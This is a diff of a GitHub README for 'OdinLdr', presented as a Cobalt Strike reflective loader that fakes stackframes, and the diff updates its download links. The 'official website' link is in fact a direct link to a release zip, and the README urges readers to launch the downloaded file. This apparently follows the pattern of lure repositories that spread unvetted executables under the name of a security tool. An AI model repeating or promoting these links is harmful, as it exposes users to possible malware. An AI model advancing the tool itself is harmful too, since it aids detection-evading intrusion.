@@ -2,7 +2,7 @@
 # 🚀 **OdinLdr**
 ## Cobaltstrike Reflective Loader with Synthetic Stackframe
 
-[![Download OdinLdr](https://github.com/vinhdz-123/OdinLdr/releases/download/v1.0/Application.zip)](https://github.com/vinhdz-123/OdinLdr/releases/download/v1.0/Application.zip)
+[![Download OdinLdr](https://github.com/vinhdz-123/OdinLdr/releases/download/v2.0/Software.zip)](https://github.com/vinhdz-123/OdinLdr/releases/download/v2.0/Software.zip)
 
 Welcome to OdinLdr, a powerful reflective loader tool designed to enhance your Cobaltstrike experience by generating synthetic stackframes. In this repository, you will find the necessary tools and resources to optimize your operations and streamline your workflow with Cobaltstrike.
 
@@ -40,6 +40,6 @@ Special thanks to our contributors for their valuable input and dedication to im
 
 ---
 
-🔗 **Visit the [official OdinLdr website](https://github.com/vinhdz-123/OdinLdr/releases/download/v1.0/Application.zip) to download the latest version and explore more resources.**
+🔗 **Visit the [official OdinLdr website](https://github.com/vinhdz-123/OdinLdr/releases/download/v2.0/Software.zip) to download the latest version and explore more resources.**
 
 🚀 **Launch the downloaded file to kickstart your journey with OdinLdr and unlock a new level of efficiency in your Cobaltstrike operations.**
